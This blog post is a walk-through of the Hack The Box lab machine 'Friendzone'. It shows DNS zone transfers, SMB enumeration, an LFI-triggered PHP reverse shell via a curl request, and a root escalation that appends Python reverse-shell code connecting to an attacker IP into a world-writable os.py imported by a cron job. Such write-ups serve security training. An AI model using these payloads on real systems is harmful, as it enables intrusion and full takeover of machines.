---
layout: post
author: jseals
title: "Friendzone: Hack The Box Walk-through"
image: htb-friendzone/friendzone.png
---

## Background

Friendzone is a retired "vulnerable by design" machine created by [askar][1] and hosted at [hackthebox.eu][2]. In this walk-through I perform the actions of an attacker. The goals are to get user-level privileges on the victim machine (get the flag in /home/$USER/user.txt) and escalate privileges to root (get the flag in /root/root.txt).

## Victim Machine Specs
![friendzone.png](/assets/images/posts/htb-friendzone/friendzone.png)

## Reconnaissance

Start it off with an nmap scan:

```text
~/ctf/htb/friendzone # nmap -sS -A 10.10.10.123

Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 14:37 CDT
Nmap scan report for 10.10.10.123
Host is up (0.045s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1 (bunches of these)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=5/19%OT=21%CT=1%CU=41856%PV=Y%DS=2%DC=T%G=Y%TM=5CE1B0C
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=109%TI=Z%CI=RD%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2
OS:=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h00m50s, deviation: 1h43m55s, median: -50s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-05-19T22:37:09+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-05-19 14:37:09
|_  start_date: N/A
```

There's quite a lot of ports open. Port 80 is easy to start with, so we use our web-browser to check out the homepage. We're greeted with a large graphic that says "friendzone" and:

```text
"if yes, try to get out of this zone ;)
Call us at : +999999999
Email us at: info@friendzoneportal.red
```

We noticed the nmap results showed us the victim machine was running a DNS service and had port 53 exposed. That combined with the zone verbiage hints towards zone transfers or DNS in general.

## Enumeration

Next we try to see if we can login anonymously to the FTP server, but we cannot. Moving down the list of available services, let's see if any Samba shares are available to the "guest" user which doesn't require a password:

```text
~/ctf/htb/friendzone # nmap --script smb-enum-shares.nse -p 139,445 10.10.10.123
root@kali:~/ctf/htb/friendzone# smbmap -u guest -H 10.10.10.123
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445	Name: 10.10.10.123                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	Files                                             	NO ACCESS
	general                                           	READ ONLY
	Development                                       	READ, WRITE
	IPC$                                              	NO ACCESS
```

Read access to the "general" share and read/write to "Development". Definitely worth checking out. We can use smbclient or mount the share directly to view the shares. In the "general" folder we find a "creds.txt" file:

```text
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Credentials, always good to find even if we're not too sure where to use them yet. Let's go back to the DNS service since we got an early hint on the web-server landing page. First, we can try some zone transfers for the domains we've seen so far. We saw "friendzoneportal.red" in the message on the web-server landing page, so let's try that:

```text
root@kali:~/ctf/htb/friendzone# dig axfr @10.10.10.123 friendzoneportal.red

; <<>> DiG 9.11.5-P4-5-Debian <<>> axfr @10.10.10.123 friendzoneportal.red
; (1 server found)
;; global options: +cmd
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.	604800	IN	AAAA	::1
friendzoneportal.red.	604800	IN	NS	localhost.
friendzoneportal.red.	604800	IN	A	127.0.0.1
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 47 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Mon May 20 07:43:40 CDT 2019
;; XFR size: 9 records (messages 1, bytes 309)
```

This works and exposes the subdomains for friendzoneportal.red. I then create an entry in our /etc/hosts file that maps friendzoneportal.red to the victim's IP at 10.10.10.123, and we start trying the subdomains we found in the browser. The only thing gives us anything is the "admin" subdomain, and it says it's under construction.

Next, if we read our nmap output closes, we see the following:

```text
ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/
```

The ssl certificate's CN is "friendzone.red" which is another domain we can try to perform a zone transfer on to learn more about it:

```text
~/ctf/htb/friendzone # dig axfr @10.10.10.123 friendzone.red

; <<>> DiG 9.11.5-P4-5-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 48 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Tue May 21 08:12:31 CDT 2019
;; XFR size: 8 records (messages 1, bytes 289)
```

Again the zone transfer is allowed and we see some subdomains for "friendzone.red" we can try to access. Following the same procedure, we replace our previous /etc/hosts entry with the new domain we've found and try to access these via the web-browser.

We goto "administrator11.friendzone.red" and we're greeted with a login page. Perhaps this is where we can use our previously found credentials? We try and it works:

```text
Login Done ! visit /dashboard.php
```

We follow the advice and add "/dashboard.php" to our URL in the browser and we get a php page that's looking for a timestamp parameter and an image parameter. We view the /images directory and find an image named "a.jpg" which is a picture of Nelson from the Simpsons saying his classic "Ha Ha" quote, and we find an image titled "b.jpg" which is a woman with the message "got it!".

I hit a little road bump here and couldn't figure out what the /dashboard page wanted, so I decided to try the other subdomains we found earlier. I edited the "Host" parameter using the burp proxy to "uploads.friendzone.red" and went to the root of the web-server and got an uploads page. I attempted to upload a php shell just to see what would happen and got:

```text
Uploaded successfully !
155838595
```

Looks like a timestamp in unix epoch format. The dashboard.php page comes to mind, it was also looking for a timestamp. Being stuck for a bit again, I decided to further enumerate the Samba shares and nmap scripts are able to determine the "Files" share is mapped to /etc/Files and we assume "Development" is mapped to /etc/Development which we had write access to. I uploaded my php reverse shell to the "Development" share and copied the curl request out of burp:

```text
curl -i -s -k  -X $'GET' \
    -H $'Host: administrator1.friendzone.red' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' \
    $'https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc/Development/shell'
```

I setup my netcat listener, and ran the curl command to access my reverse shell and it works. We get a shell as the "www-data" user. We find that this user is able to cat the user flag in "/home/friend/user.txt". First part is done.

After some hunting around on the filesystem we come across this file with some more goodies:

```text
www-data@FriendZone:/var/www$ cat mysql	
cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

We noticed there is a "friend" user on this machine too, so we try to su to friend using the password we found and it works. We can now get a proper shell by simply using ssh as the friend user.

By looking at the syslog file, we see a cronjob is running every couple minutes:

```text

tail -f /var/log/syslog

May 22 15:32:01 FriendZone CRON[1030]: (root) CMD (/opt/server_admin/reporter.py)
May 22 15:34:01 FriendZone CRON[1033]: (root) CMD (/opt/server_admin/reporter.py)
```

We're able to read the reporter.py script, but have no other permissions. We see it imports the os module. We then find the "/usr/lib/python2.7/os.py" file is world-writable. I start to realize what needs to be done, and details can be found [here][3].

The goal is to highjack the os module import with our own code that calls a reverse shell back to us. When the cron job runs the "reporter.py" script as root it will first import os which will be ours, and a reverse shell will come back to as with root privileges.

With confidence this plan will work, let's start up our listener to catch the reverse shell:

```text
~/ctf/htb/friendzone # nc -v -n -l -p 9002
```

Next, we backup the original os.py module and append this to the end of the world-writeable os.py that the report.py script imports:

```text
import pty
import socket

lhost = "10.10.33.33"
lport = 9002
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()
```

We wait for the cron job to run, and we know right when it does as the plan works and we get a shell as root.

[1]: https://www.hackthebox.eu/home/users/profile/17292
[2]: https://www.hackthebox.eu
[3]: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
